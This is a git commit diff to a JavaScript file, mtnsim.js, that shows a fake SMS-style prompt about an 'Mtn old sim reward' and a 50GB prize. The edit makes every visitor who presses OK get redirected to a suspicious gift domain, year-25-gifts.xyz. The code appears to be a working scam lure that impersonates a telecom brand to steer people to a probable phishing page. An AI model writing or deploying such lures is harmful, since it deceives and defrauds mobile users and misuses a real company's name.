57a74a5a303b04aa2c7f0279dd309b41ec26d43f
bigetijazz18 <bigetijazz18@gmail.com>
2025-02-15 07:09:41 +0100

    Update mtnsim.js

--- mtnsim.js
+++ mtnsim.js
@@ -1,6 +1,6 @@
 
 var password = 'GET REWARD NOW'
 password=prompt('SMS: Welcome To Mtn old sim reward, Kindly Press OK to GET REWARD NOW ','GET REWARD NOW');
-if (password != 'GET REWARD NOW') {
+if (password != 'CLAIM 50GB') {
 location.href='https://www.year-25-gifts.xyz/mtn50gb';
-}</script> 
+}
